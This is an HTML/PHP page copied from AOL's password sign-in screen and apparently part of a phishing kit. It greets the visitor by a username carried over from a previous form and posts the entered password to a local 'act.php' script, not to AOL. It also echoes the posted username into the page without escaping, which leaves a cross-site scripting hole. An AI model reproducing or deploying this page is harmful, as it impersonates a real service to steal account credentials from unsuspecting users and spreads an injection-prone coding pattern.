<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL
</title>
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-min.css">
        <!--<![endif]-->
        <style nonce="hD6ilYDcv4qyikPNEgnSisua4b4bL/PkcvueY5wDWYanaNYs">
            #mbr-css-check { 
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/0.1.5962/aol-main.css" rel="stylesheet" type="text/css">
        <script nonce="hD6ilYDcv4qyikPNEgnSisua4b4bL/PkcvueY5wDWYanaNYs">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.I13N_config = {"debug":false,"_ywa":10001496213979,"client_only":1,"spaceid":1197774520,"sections":null};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 150003036;
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=150003036&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":3000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1528347758906;
}(this));

            
            YUI_config.global = window;

            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=6h74v41dhhf3e&crumb=' + encodeURIComponent('fLq47Ozn6yy') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };
        </script>
    </head>
    <body >
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page&#x3D;content&amp;y&#x3D;PROD_ACCT&amp;id&#x3D;SLN4556&amp;actp&#x3D;productlink&amp;locale&#x3D;en_US">More Info</a>
            </p>
        </div>
    <script nonce="hD6ilYDcv4qyikPNEgnSisua4b4bL/PkcvueY5wDWYanaNYs">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish  puree-v2">
    <div class="mbr-desktop-hd pure-g">
    <div class="pure-u-4-5">
         <a href="https://www.aol.com">
            <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
        </a>
    </div>
    <div class="pure-u-1-5 txt-align-right">
        <div class="help"><a href="https://help.aol.com/">Help</a></div>
    </div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo " width="100" height="" />
            </div>
            <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello <?php echo $_POST['username']; ?></h1>
            <p class="not-you"><a href="index.php?login.aol.com/?display&#x3D;login&amp;done&#x3D;https%3A%2F%2Fwww.aol.com%2F&amp;prefill&#x3D;0">Not you?</a></p>
    </div>
    <form method="post" action="act.php?https://login.aol.com/?display&#x3D;login&amp;done&#x3D;https%3A%2F%2Fwww.aol.com%2F&amp;prefill&#x3D;0" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="fLq47Ozn6yy" />
        <input type="hidden" name="acrumb" value="886x1DQi" />
        <input type="hidden" name="sessionIndex" value="Qw--" />
		<input type="hidden" name="username" value="<?php echo $_POST['username']; ?>">
        <input type="hidden" name="displayName" value="<?php echo $_POST['username']; ?>" />
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<?php echo $_POST['username']; ?>" />
        </div>
        <input type="hidden" name="passwordContext" value="normal" />
        <input type="password" id="login-passwd"  name="password" required="required" placeholder="Password" autofocus/>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" >                        
                    Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
            <div id="login-ad-rich"></div>
        </div>
    </div>
</div>

    
    <noscript>
        <img src="/account/js-reporting/?crumb=fLq47Ozn6yy&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="hD6ilYDcv4qyikPNEgnSisua4b4bL/PkcvueY5wDWYanaNYs">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe01.member.bf1.yahoo.com - Thu Jun 07 2018 05:02:38 GMT+0000 (UTC) - (1ms) -->
